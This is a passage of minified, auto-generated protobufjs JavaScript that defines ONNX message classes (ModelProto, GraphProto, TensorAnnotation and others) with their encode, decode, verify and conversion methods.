keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return ModelProto.prototype.irVersion=$util.Long?$util.Long.fromBits(0,0,!1):0,ModelProto.prototype.opsetImport=$util.emptyArray,ModelProto.prototype.producerName="",ModelProto.prototype.producerVersion="",ModelProto.prototype.domain="",ModelProto.prototype.modelVersion=$util.Long?$util.Long.fromBits(0,0,!1):0,ModelProto.prototype.docString="",ModelProto.prototype.graph=null,ModelProto.prototype.metadataProps=$util.emptyArray,ModelProto.prototype.trainingInfo=$util.emptyArray,ModelProto.prototype.functions=$util.emptyArray,ModelProto.create=function create(properties){return new ModelProto(properties)},ModelProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.irVersion&&Object.hasOwnProperty.call(message,"irVersion")&&writer.uint32(8).int64(message.irVersion),null!=message.producerName&&Object.hasOwnProperty.call(message,"producerName")&&writer.uint32(18).string(message.producerName),null!=message.producerVersion&&Object.hasOwnProperty.call(message,"producerVersion")&&writer.uint32(26).string(message.producerVersion),null!=message.domain&&Object.hasOwnProperty.call(message,"domain")&&writer.uint32(34).string(message.domain),null!=message.modelVersion&&Object.hasOwnProperty.call(message,"modelVersion")&&writer.uint32(40).int64(message.modelVersion),null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(50).string(message.docString),null!=message.graph&&Object.hasOwnProperty.call(message,"graph")&&$root.onnx.GraphProto.encode(message.graph,writer.uint32(58).fork()).ldelim(),null!=message.opsetImport&&message.opsetImport.length)for(var i=0;i<message.opsetImport.length;++i)$root.onnx.OperatorSetIdProto.encode(message.opsetImport[i],writer.uint32(66).fork()).ldelim();if(null!=message.metadataProps&&message.metadataProps.length)for(i=0;i<message.metadataProps.length;++i)$root.onnx.StringStringEntryProto.encode(message.metadataProps[i],writer.uint32(114).fork()).ldelim();if(null!=message.trainingInfo&&message.trainingInfo.length)for(i=0;i<message.trainingInfo.length;++i)$root.onnx.TrainingInfoProto.encode(message.trainingInfo[i],writer.uint32(162).fork()).ldelim();if(null!=message.functions&&message.functions.length)for(i=0;i<message.functions.length;++i)$root.onnx.FunctionProto.encode(message.functions[i],writer.uint32(202).fork()).ldelim();return writer},ModelProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},ModelProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.ModelProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.irVersion=reader.int64();break;case 8:message.opsetImport&&message.opsetImport.length||(message.opsetImport=[]),message.opsetImport.push($root.onnx.OperatorSetIdProto.decode(reader,reader.uint32()));break;case 2:message.producerName=reader.string();break;case 3:message.producerVersion=reader.string();break;case 4:message.domain=reader.string();break;case 5:message.modelVersion=reader.int64();break;case 6:message.docString=reader.string();break;case 7:message.graph=$root.onnx.GraphProto.decode(reader,reader.uint32());break;case 14:message.metadataProps&&message.metadataProps.length||(message.metadataProps=[]),message.metadataProps.push($root.onnx.StringStringEntryProto.decode(reader,reader.uint32()));break;case 20:message.trainingInfo&&message.trainingInfo.length||(message.trainingInfo=[]),message.trainingInfo.push($root.onnx.TrainingInfoProto.decode(reader,reader.uint32()));break;case 25:message.functions&&message.functions.length||(message.functions=[]),message.functions.push($root.onnx.FunctionProto.decode(reader,reader.uint32()));break;default:reader.skipType(7&tag)}}return message},ModelProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},ModelProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.irVersion&&message.hasOwnProperty("irVersion")&&!($util.isInteger(message.irVersion)||message.irVersion&&$util.isInteger(message.irVersion.low)&&$util.isInteger(message.irVersion.high)))return"irVersion: integer|Long expected";if(null!=message.opsetImport&&message.hasOwnProperty("opsetImport")){if(!Array.isArray(message.opsetImport))return"opsetImport: array expected";for(var i=0;i<message.opsetImport.length;++i)if(error=$root.onnx.OperatorSetIdProto.verify(message.opsetImport[i]))return"opsetImport."+error}if(null!=message.producerName&&message.hasOwnProperty("producerName")&&!$util.isString(message.producerName))return"producerName: string expected";if(null!=message.producerVersion&&message.hasOwnProperty("producerVersion")&&!$util.isString(message.producerVersion))return"producerVersion: string expected";if(null!=message.domain&&message.hasOwnProperty("domain")&&!$util.isString(message.domain))return"domain: string expected";if(null!=message.modelVersion&&message.hasOwnProperty("modelVersion")&&!($util.isInteger(message.modelVersion)||message.modelVersion&&$util.isInteger(message.modelVersion.low)&&$util.isInteger(message.modelVersion.high)))return"modelVersion: integer|Long expected";if(null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString))return"docString: string expected";if(null!=message.graph&&message.hasOwnProperty("graph")&&(error=$root.onnx.GraphProto.verify(message.graph)))return"graph."+error;if(null!=message.metadataProps&&message.hasOwnProperty("metadataProps")){if(!Array.isArray(message.metadataProps))return"metadataProps: array expected";for(i=0;i<message.metadataProps.length;++i)if(error=$root.onnx.StringStringEntryProto.verify(message.metadataProps[i]))return"metadataProps."+error}if(null!=message.trainingInfo&&message.hasOwnProperty("trainingInfo")){if(!Array.isArray(message.trainingInfo))return"trainingInfo: array expected";for(i=0;i<message.trainingInfo.length;++i)if(error=$root.onnx.TrainingInfoProto.verify(message.trainingInfo[i]))return"trainingInfo."+error}if(null!=message.functions&&message.hasOwnProperty("functions")){if(!Array.isArray(message.functions))return"functions: array expected";for(i=0;i<message.functions.length;++i){var error;if(error=$root.onnx.FunctionProto.verify(message.functions[i]))return"functions."+error}}return null},ModelProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.ModelProto)return object;var message=new $root.onnx.ModelProto;if(null!=object.irVersion&&($util.Long?(message.irVersion=$util.Long.fromValue(object.irVersion)).unsigned=!1:"string"==typeof object.irVersion?message.irVersion=parseInt(object.irVersion,10):"number"==typeof object.irVersion?message.irVersion=object.irVersion:"object"==typeof object.irVersion&&(message.irVersion=new $util.LongBits(object.irVersion.low>>>0,object.irVersion.high>>>0).toNumber())),object.opsetImport){if(!Array.isArray(object.opsetImport))throw TypeError(".onnx.ModelProto.opsetImport: array expected");message.opsetImport=[];for(var i=0;i<object.opsetImport.length;++i){if("object"!=typeof object.opsetImport[i])throw TypeError(".onnx.ModelProto.opsetImport: object expected");message.opsetImport[i]=$root.onnx.OperatorSetIdProto.fromObject(object.opsetImport[i])}}if(null!=object.producerName&&(message.producerName=String(object.producerName)),null!=object.producerVersion&&(message.producerVersion=String(object.producerVersion)),null!=object.domain&&(message.domain=String(object.domain)),null!=object.modelVersion&&($util.Long?(message.modelVersion=$util.Long.fromValue(object.modelVersion)).unsigned=!1:"string"==typeof object.modelVersion?message.modelVersion=parseInt(object.modelVersion,10):"number"==typeof object.modelVersion?message.modelVersion=object.modelVersion:"object"==typeof object.modelVersion&&(message.modelVersion=new $util.LongBits(object.modelVersion.low>>>0,object.modelVersion.high>>>0).toNumber())),null!=object.docString&&(message.docString=String(object.docString)),null!=object.graph){if("object"!=typeof object.graph)throw TypeError(".onnx.ModelProto.graph: object expected");message.graph=$root.onnx.GraphProto.fromObject(object.graph)}if(object.metadataProps){if(!Array.isArray(object.metadataProps))throw TypeError(".onnx.ModelProto.metadataProps: array expected");for(message.metadataProps=[],i=0;i<object.metadataProps.length;++i){if("object"!=typeof object.metadataProps[i])throw TypeError(".onnx.ModelProto.metadataProps: object expected");message.metadataProps[i]=$root.onnx.StringStringEntryProto.fromObject(object.metadataProps[i])}}if(object.trainingInfo){if(!Array.isArray(object.trainingInfo))throw TypeError(".onnx.ModelProto.trainingInfo: array expected");for(message.trainingInfo=[],i=0;i<object.trainingInfo.length;++i){if("object"!=typeof object.trainingInfo[i])throw TypeError(".onnx.ModelProto.trainingInfo: object expected");message.trainingInfo[i]=$root.onnx.TrainingInfoProto.fromObject(object.trainingInfo[i])}}if(object.functions){if(!Array.isArray(object.functions))throw TypeError(".onnx.ModelProto.functions: array expected");for(message.functions=[],i=0;i<object.functions.length;++i){if("object"!=typeof object.functions[i])throw TypeError(".onnx.ModelProto.functions: object expected");message.functions[i]=$root.onnx.FunctionProto.fromObject(object.functions[i])}}return message},ModelProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.opsetImport=[],object.metadataProps=[],object.trainingInfo=[],object.functions=[]),options.defaults){if($util.Long){var long=new $util.Long(0,0,!1);object.irVersion=options.longs===String?long.toString():options.longs===Number?long.toNumber():long}else object.irVersion=options.longs===String?"0":0;object.producerName="",object.producerVersion="",object.domain="",$util.Long?(long=new $util.Long(0,0,!1),object.modelVersion=options.longs===String?long.toString():options.longs===Number?long.toNumber():long):object.modelVersion=options.longs===String?"0":0,object.docString="",object.graph=null}if(null!=message.irVersion&&message.hasOwnProperty("irVersion")&&("number"==typeof message.irVersion?object.irVersion=options.longs===String?String(message.irVersion):message.irVersion:object.irVersion=options.longs===String?$util.Long.prototype.toString.call(message.irVersion):options.longs===Number?new $util.LongBits(message.irVersion.low>>>0,message.irVersion.high>>>0).toNumber():message.irVersion),null!=message.producerName&&message.hasOwnProperty("producerName")&&(object.producerName=message.producerName),null!=message.producerVersion&&message.hasOwnProperty("producerVersion")&&(object.producerVersion=message.producerVersion),null!=message.domain&&message.hasOwnProperty("domain")&&(object.domain=message.domain),null!=message.modelVersion&&message.hasOwnProperty("modelVersion")&&("number"==typeof message.modelVersion?object.modelVersion=options.longs===String?String(message.modelVersion):message.modelVersion:object.modelVersion=options.longs===String?$util.Long.prototype.toString.call(message.modelVersion):options.longs===Number?new $util.LongBits(message.modelVersion.low>>>0,message.modelVersion.high>>>0).toNumber():message.modelVersion),null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),null!=message.graph&&message.hasOwnProperty("graph")&&(object.graph=$root.onnx.GraphProto.toObject(message.graph,options)),message.opsetImport&&message.opsetImport.length){object.opsetImport=[];for(var j=0;j<message.opsetImport.length;++j)object.opsetImport[j]=$root.onnx.OperatorSetIdProto.toObject(message.opsetImport[j],options)}if(message.metadataProps&&message.metadataProps.length)for(object.metadataProps=[],j=0;j<message.metadataProps.length;++j)object.metadataProps[j]=$root.onnx.StringStringEntryProto.toObject(message.metadataProps[j],options);if(message.trainingInfo&&message.trainingInfo.length)for(object.trainingInfo=[],j=0;j<message.trainingInfo.length;++j)object.trainingInfo[j]=$root.onnx.TrainingInfoProto.toObject(message.trainingInfo[j],options);if(message.functions&&message.functions.length)for(object.functions=[],j=0;j<message.functions.length;++j)object.functions[j]=$root.onnx.FunctionProto.toObject(message.functions[j],options);return object},ModelProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},ModelProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.ModelProto"},ModelProto}(),onnx.StringStringEntryProto=function(){function StringStringEntryProto(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return StringStringEntryProto.prototype.key="",StringStringEntryProto.prototype.value="",StringStringEntryProto.create=function create(properties){return new StringStringEntryProto(properties)},StringStringEntryProto.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.key&&Object.hasOwnProperty.call(message,"key")&&writer.uint32(10).string(message.key),null!=message.value&&Object.hasOwnProperty.call(message,"value")&&writer.uint32(18).string(message.value),writer},StringStringEntryProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},StringStringEntryProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.StringStringEntryProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.key=reader.string();break;case 2:message.value=reader.string();break;default:reader.skipType(7&tag)}}return message},StringStringEntryProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},StringStringEntryProto.verify=function verify(message){return"object"!=typeof message||null===message?"object expected":null!=message.key&&message.hasOwnProperty("key")&&!$util.isString(message.key)?"key: string expected":null!=message.value&&message.hasOwnProperty("value")&&!$util.isString(message.value)?"value: string expected":null},StringStringEntryProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.StringStringEntryProto)return object;var message=new $root.onnx.StringStringEntryProto;return null!=object.key&&(message.key=String(object.key)),null!=object.value&&(message.value=String(object.value)),message},StringStringEntryProto.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.key="",object.value=""),null!=message.key&&message.hasOwnProperty("key")&&(object.key=message.key),null!=message.value&&message.hasOwnProperty("value")&&(object.value=message.value),object},StringStringEntryProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},StringStringEntryProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.StringStringEntryProto"},StringStringEntryProto}(),onnx.TensorAnnotation=function(){function TensorAnnotation(properties){if(this.quantParameterTensorNames=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return TensorAnnotation.prototype.tensorName="",TensorAnnotation.prototype.quantParameterTensorNames=$util.emptyArray,TensorAnnotation.create=function create(properties){return new TensorAnnotation(properties)},TensorAnnotation.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.tensorName&&Object.hasOwnProperty.call(message,"tensorName")&&writer.uint32(10).string(message.tensorName),null!=message.quantParameterTensorNames&&message.quantParameterTensorNames.length)for(var i=0;i<message.quantParameterTensorNames.length;++i)$root.onnx.StringStringEntryProto.encode(message.quantParameterTensorNames[i],writer.uint32(18).fork()).ldelim();return writer},TensorAnnotation.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},TensorAnnotation.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TensorAnnotation;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.tensorName=reader.string();break;case 2:message.quantParameterTensorNames&&message.quantParameterTensorNames.length||(message.quantParameterTensorNames=[]),message.quantParameterTensorNames.push($root.onnx.StringStringEntryProto.decode(reader,reader.uint32()));break;default:reader.skipType(7&tag)}}return message},TensorAnnotation.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},TensorAnnotation.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.tensorName&&message.hasOwnProperty("tensorName")&&!$util.isString(message.tensorName))return"tensorName: string expected";if(null!=message.quantParameterTensorNames&&message.hasOwnProperty("quantParameterTensorNames")){if(!Array.isArray(message.quantParameterTensorNames))return"quantParameterTensorNames: array expected";for(var i=0;i<message.quantParameterTensorNames.length;++i){var error=$root.onnx.StringStringEntryProto.verify(message.quantParameterTensorNames[i]);if(error)return"quantParameterTensorNames."+error}}return null},TensorAnnotation.fromObject=function fromObject(object){if(object instanceof $root.onnx.TensorAnnotation)return object;var message=new $root.onnx.TensorAnnotation;if(null!=object.tensorName&&(message.tensorName=String(object.tensorName)),object.quantParameterTensorNames){if(!Array.isArray(object.quantParameterTensorNames))throw TypeError(".onnx.TensorAnnotation.quantParameterTensorNames: array expected");message.quantParameterTensorNames=[];for(var i=0;i<object.quantParameterTensorNames.length;++i){if("object"!=typeof object.quantParameterTensorNames[i])throw TypeError(".onnx.TensorAnnotation.quantParameterTensorNames: object expected");message.quantParameterTensorNames[i]=$root.onnx.StringStringEntryProto.fromObject(object.quantParameterTensorNames[i])}}return message},TensorAnnotation.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.quantParameterTensorNames=[]),options.defaults&&(object.tensorName=""),null!=message.tensorName&&message.hasOwnProperty("tensorName")&&(object.tensorName=message.tensorName),message.quantParameterTensorNames&&message.quantParameterTensorNames.length){object.quantParameterTensorNames=[];for(var j=0;j<message.quantParameterTensorNames.length;++j)object.quantParameterTensorNames[j]=$root.onnx.StringStringEntryProto.toObject(message.quantParameterTensorNames[j],options)}return object},TensorAnnotation.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},TensorAnnotation.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TensorAnnotation"},TensorAnnotation}(),onnx.GraphProto=function(){function GraphProto(properties){if(this.node=[],this.initializer=[],this.sparseInitializer=[],this.input=[],this.output=[],this.valueInfo=[],this.quantizationAnnotation=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return GraphProto.prototype.node=$util.emptyArray,GraphProto.prototype.name="",GraphProto.prototype.initializer=$util.emptyArray,GraphProto.prototype.sparseInitializer=$util.emptyArray,GraphProto.prototype.docString="",GraphProto.prototype.input=$util.emptyArray,GraphProto.prototype.output=$util.emptyArray,GraphProto.prototype.valueInfo=$util.emptyArray,GraphProto.prototype.quantizationAnnotation=$util.emptyArray,GraphProto.create=function create(properties){return new GraphProto(properties)},GraphProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.node&&message.node.length)for(var i=0;i<message.node.length;++i)$root.onnx.NodeProto.encode(message.node[i],writer.uint32(10).fork()).ldelim();if(null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(18).string(message.name),null!=message.initializer&&message.initializer.length)for(i=0;i<message.initializer.length;++i)$root.onnx.TensorProto.encode(message.initializer[i],writer.uint32(42).fork()).ldelim();if(null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(82).string(message.docString),null!=message.input&&message.input.length)for(i=0;i<message.input.length;++i)$root.onnx.ValueInfoProto.encode(message.input[i],writer.uint32(90).fork()).ldelim();if(null!=message.output&&message.output.length)for(i=0;i<message.output.length;++i)$root.onnx.ValueInfoProto.encode(message.output[i],writer.uint32(98).fork()).ldelim();if(null!=message.valueInfo&&message.valueInfo.length)for(i=0;i<message.valueInfo.length;++i)$root.onnx.ValueInfoProto.encode(message.valueInfo[i],writer.uint32(106).fork()).ldelim();if(null!=message.quantizationAnnotation&&message.quantizationAnnotation.length)for(i=0;i<message.quantizationAnnotation.length;++i)$root.onnx.TensorAnnotation.encode(message.quantizationAnnotation[i],writer.uint32(114).fork()).ldelim();if(null!=message.sparseInitializer&&message.sparseInitializer.length)for(i=0;i<message.sparseInitializer.length;++i)$root.onnx.SparseTensorProto.encode(message.sparseInitializer[i],writer.uint32(122).fork()).ldelim();return writer},GraphProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},GraphProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.GraphProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.node&&message.node.length||(message.node=[]),message.node.push($root.onnx.NodeProto.decode(reader,reader.uint32()));break;case 2:message.name=reader.string();break;case 5:message.initializer&&message.initializer.length||(message.initializer=[]),message.initializer.push($root.onnx.TensorProto.decode(reader,reader.uint32()));break;case 15:message.sparseInitializer&&message.sparseInitializer.length||(message.sparseInitializer=[]),message.sparseInitializer.push($root.onnx.SparseTensorProto.decode(reader,reader.uint32()));break;case 10:message.docString=reader.string();break;case 11:message.input&&message.input.length||(message.input=[]),message.input.push($root.onnx.ValueInfoProto.decode(reader,reader.uint32()));break;case 12:message.output&&message.output.length||(message.output=[]),message.output.push($root.onnx.ValueInfoProto.decode(reader,reader.uint32()));break;case 13:message.valueInfo&&message.valueInfo.length||(message.valueInfo=[]),message.valueInfo.push($root.onnx.ValueInfoProto.decode(reader,reader.uint32()));break;case 14:message.quantizationAnnotation&&message.quantizationAnnotation.length||(message.quantizationAnnotation=[]),message.quantizationAnnotation.push($root.onnx.TensorAnnotation.decode(reader,reader.uint32()));break;default:reader.skipType(7&tag)}}return message},GraphProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},GraphProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.node&&message.hasOwnProperty("node")){if(!Array.isArray(message.node))return"node: array expected";for(var i=0;i<message.node.length;++i)if(error=$root.onnx.NodeProto.verify(message.node[i]))return"node."+error}if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.initializer&&message.hasOwnProperty("initializer")){if(!Array.isArray(message.initializer))return"initializer: array expected";for(i=0;i<message.initializer.length;++i)if(error=$root.onnx.TensorProto.verify(message.initializer[i]))return"initializer."+error}if(null!=message.sparseInitializer&&message.hasOwnProperty("sparseInitializer")){if(!Array.isArray(message.sparseInitializer))return"sparseInitializer: array expected";for(i=0;i<message.sparseInitializer.length;++i)if(error=$root.onnx.SparseTensorProto.verify(message.sparseInitializer[i]))return"sparseInitializer."+error}if(null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString))return"docString: string expected";if(null!=message.input&&message.hasOwnProperty("input")){if(!Array.isArray(message.input))return"input: array expected";for(i=0;i<message.input.length;++i)if(error=$root.onnx.ValueInfoProto.verify(message.input[i]))return"input."+error}if(null!=message.output&&message.hasOwnProperty("output")){if(!Array.isArray(message.output))return"output: array expected";for(i=0;i<message.output.length;++i)if(error=$root.onnx.ValueInfoProto.verify(message.output[i]))return"output."+error}if(null!=message.valueInfo&&message.hasOwnProperty("valueInfo")){if(!Array.isArray(message.valueInfo))return"valueInfo: array expected";for(i=0;i<message.valueInfo.length;++i)if(error=$root.onnx.ValueInfoProto.verify(message.valueInfo[i]))return"valueInfo."+error}if(null!=message.quantizationAnnotation&&message.hasOwnProperty("quantizationAnnotation")){if(!Array.isArray(message.quantizationAnnotation))return"quantizationAnnotation: array expected";for(i=0;i<message.quantizationAnnotation.length;++i){var error;if(error=$root.onnx.TensorAnnotation.verify(message.quantizationAnnotation[i]))return"quantizationAnnotation."+error}}return null},GraphProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.GraphProto)return object;var message=new $root.onnx.GraphProto;if(object.node){if(!Array.isArray(object.node))throw TypeError(".onnx.GraphProto.node: array expected");message.node=[];for(var i=0;i<object.node.length;++i){if("object"!=typeof object.node[i])throw TypeError(".onnx.GraphProto.node: object expected");message.node[i]=$root.onnx.NodeProto.fromObject(object.node[i])}}if(null!=object.name&&(message.name=String(object.name)),object.initializer){if(!Array.isArray(object.initializer))throw TypeError(".onnx.GraphProto.initializer: array expected");for(message.initializer=[],i=0;i<object.initializer.length;++i){if("object"!=typeof object.initializer[i])throw TypeError(".onnx.GraphProto.initializer: object expected");message.initializer[i]=$root.onnx.TensorProto.fromObject(object.initializer[i])}}if(object.sparseInitializer){if(!Array.isArray(object.sparseInitializer))throw TypeError(".onnx.GraphProto.sparseInitializer: array expected");for(message.sparseInitializer=[],i=0;i<object.sparseInitializer.length;++i){if("object"!=typeof object.sparseInitializer[i])throw TypeError(".onnx.GraphProto.sparseInitializer: object expected");message.sparseInitializer[i]=$root.onnx.SparseTensorProto.fromObject(object.sparseInitializer[i])}}if(null!=object.docString&&(message.docString=String(object.docString)),object.input){if(!Array.isArray(object.input))throw TypeError(".onnx.GraphProto.input: array expected");for(message.input=[],i=0;i<object.input.length;++i){if("object"!=typeof object.input[i])throw TypeError(".onnx.GraphProto.input: object expected");message.input[i]=$root.onnx.ValueInfoProto.fromObject(object.input[i])}}if(object.output){if(!Array.isArray(object.output))throw TypeError(".onnx.GraphProto.output: array expected");for(message.output=[],i=0;i<object.output.length;++i){if("object"!=typeof object.output[i])throw TypeError(".onnx.GraphProto.output: object expected");message.output[i]=$root.onnx.ValueInfoProto.fromObject(object.output[i])}}if(object.valueInfo){if(!Array.isArray(object.valueInfo))throw TypeError(".onnx.GraphProto.valueInfo: array expected");for(message.valueInfo=[],i=0;i<object.valueInfo.length;++i){if("object"!=typeof object.valueInfo[i])throw TypeError(".onnx.GraphProto.valueInfo: object expected");message.valueInfo[i]=$root.onnx.ValueInfoProto.fromObject(object.valueInfo[i])}}if(object.quantizationAnnotation){if(!Array.isArray(object.quantizationAnnotation))throw TypeError(".onnx.GraphProto.quantizationAnnotation: array expected");for(message.quantizationAnnotation=[],i=0;i<object.quantizationAnnotation.length;++i){if("object"!=typeof object.quantizationAnnotation[i])throw TypeError(".onnx.GraphProto.quantizationAnnotation: object expected");message.quantizationAnnotation[i]=$root.onnx.TensorAnnotation.fromObject(object.quantizationAnnotation[i])}}return message},GraphProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.node=[],object.initializer=[],object.input=[],object.output=[],object.valueInfo=[],object.quantizationAnnotation=[],object.sparseInitializer=[]),options.defaults&&(object.name="",object.docString=""),message.node&&message.node.length){object.node=[];for(var j=0;j<message.node.length;++j)object.node[j]=$root.onnx.NodeProto.toObject(message.node[j],options)}if(null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),message.initializer&&message.initializer.length)for(object.initializer=[],j=0;j<message.initializer.length;++j)object.initializer[j]=$root.onnx.TensorProto.toObject(message.initializer[j],options);if(null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),message.input&&message.input.length)for(object.input=[],j=0;j<message.input.length;++j)object.input[j]=$root.onnx.ValueInfoProto.toObject(message.input[j],options);if(message.output&&message.output.length)for(object.output=[],j=0;j<message.output.length;++j)object.output[j]=$root.onnx.ValueInfoProto.toObject(message.output[j],options);if(message.valueInfo&&message.valueInfo.length)for(object.valueInfo=[],j=0;j<message.valueInfo.length;++j)object.valueInfo[j]=$root.onnx.ValueInfoProto.toObject(message.valueInfo[j],options);if(message.quantizationAnnotation&&message.quantizationAnnotation.length)for(object.quantizationAnnotation=[],j=0;j<message.quantizationAnnotation.length;++j)object.quantizationAnnotation[j]=$root.onnx.TensorAnnotation.toObject(message.quantizationAnnotation[j],options);if(message.sparseInitializer&&message.sparseInitializer.length)for(object.sparseInitializer=[],j=0;j<message.sparseInitializer.length;++j)object.sparseInitializer[j]=$root.onnx.SparseTensorProto.toObject(message.sparseInitializer[j],options);return object},GraphProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},GraphProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.GraphProto"},GraphProto}(),onnx.TensorProto=function(){function TensorProto(properties){if(this.dims=[],this.floatData=[],this.int32Data=[],this.stringData=[],this.int64Data=[],this.externalData=[],this.doubleData=[],this.uint64Data=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return TensorProto.prototype.dims=$util.emptyArray,TensorProto.prototype.dataType=0,TensorProto.prototype.segment=null,TensorProto.prototype.floatData=$util.emptyArray,TensorProto.prototype.int32Data=$util.emptyArray,TensorProto.prototype.stringData=$util.emptyArray,TensorProto.prototype.int64Data=$util.emptyArray,TensorProto.prototype.name="",TensorProto.prototype.docString="",TensorProto.prototype.rawData=$util.newBuffer([]),TensorProto.prototype.externalData=$util.emptyArray,TensorProto.prototype.dataLocation=0,TensorProto.prototype.doubleData=$util.emptyArray,TensorProto.prototype.uint64Data=$util.emptyArray,TensorProto.create=function create(properties){return new TensorProto(properties)},TensorProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.dims&&message.dims.length){writer.uint32(10).fork();for(var i=0;i<message.dims.length;++i)writer.int64(message.dims[i]);writer.ldelim()}if(null!=message.dataType&&Object.hasOwnProperty.call(message,"dataType")&&writer.uint32(16).int32(message.dataType),null!=message.segment&&Object.hasOwnProperty.call(message,"segment")&&$root.onnx.TensorProto.Segment.encode(message.segment,writer.uint32(26).fork()).ldelim(),null!=message.floatData&&message.floatData.length){for(writer.uint32(34).fork(),i=0;i<message.floatData.length;++i)writer.float(message.floatData[i]);writer.ldelim()}if(null!=message.int32Data&&message.int32Data.length){for(writer.uint32(42).fork(),i=0;i<message.int32Data.length;++i)writer.int32(message.int32Data[i]);writer.ldelim()}if(null!=message.stringData&&message.stringData.length)for(i=0;i<message.stringData.length;++i)writer.uint32(50).bytes(message.stringData[i]);if(null!=message.int64Data&&message.int64Data.length){for(writer.uint32(58).fork(),i=0;i<message.int64Data.length;++i)writer.int64(message.int64Data[i]);writer.ldelim()}if(null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(66).string(message.name),null!=message.rawData&&Object.hasOwnProperty.call(message,"rawData")&&writer.uint32(74).bytes(message.rawData),null!=message.doubleData&&message.doubleData.length){for(writer.uint32(82).fork(),i=0;i<message.doubleData.length;++i)writer.double(message.doubleData[i]);writer.ldelim()}if(null!=message.uint64Data&&message.uint64Data.length){for(writer.uint32(90).fork(),i=0;i<message.uint64Data.length;++i)writer.uint64(message.uint64Data[i]);writer.ldelim()}if(null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(98).string(message.docString),null!=message.externalData&&message.externalData.length)for(i=0;i<message.externalData.length;++i)$root.onnx.StringStringEntryProto.encode(message.externalData[i],writer.uint32(106).fork()).ldelim();return null!=message.dataLocation&&Object.hasOwnProperty.call(message,"dataLocation")&&writer.uint32(112).int32(message.dataLocation),writer},TensorProto.encodeDelimited=function 